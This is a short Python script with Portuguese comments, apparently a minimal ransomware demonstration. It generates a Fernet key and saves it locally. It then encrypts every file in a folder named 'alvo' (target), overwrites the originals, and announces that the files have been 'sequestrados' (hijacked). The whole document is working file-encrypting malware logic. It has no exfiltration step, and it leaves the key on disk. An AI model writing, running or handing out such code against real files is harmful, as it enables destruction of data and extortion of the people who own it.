import os
from cryptography.fernet import Fernet

# Gerar a chave de criptografia
key = Fernet.generate_key()
with open("chave.key", "wb") as key_file:
    key_file.write(key)

# Carregar a chave
fernet = Fernet(key)

# Localizar arquivos na pasta alvo
pasta = "alvo"
for arquivo in os.listdir(pasta):
    caminho_completo = os.path.join(pasta, arquivo)
    
    # Ler o arquivo original
    with open(caminho_completo, "rb") as f:
        dados = f.read()
    
    # Criptografar os dados
    dados_criptografados = fernet.encrypt(dados)
    
    # Sobrescrever o arquivo
    with open(caminho_completo, "wb") as f:
        f.write(dados_criptografados)

print("Arquivos na pasta 'alvo' foram sequestrados!")